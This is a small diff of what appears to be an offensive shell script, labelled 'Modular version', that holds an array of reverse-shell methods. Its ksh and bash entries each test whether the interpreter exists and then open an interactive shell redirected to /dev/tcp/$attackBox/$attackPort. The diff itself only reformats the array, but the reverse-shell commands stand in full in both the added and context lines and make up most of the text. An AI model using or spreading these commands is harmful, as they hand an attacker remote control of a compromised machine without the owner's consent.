@@ -2,7 +2,8 @@
 
 # Modular version
 
-methods=( "ksh,if ksh -c 'exit',ksh -c 'ksh -i > /dev/tcp/$attackBox/$attackPort 2>&1 0>&1':"
+methods=(
+	"ksh,if ksh -c 'exit',ksh -c 'ksh -i > /dev/tcp/$attackBox/$attackPort 2>&1 0>&1':"
 	"bash,if bash -c 'exit',bash -c 'bash -i > /dev/tcp/$attackBox/$attackPort 2>&1 0>&1':"
 	)
 
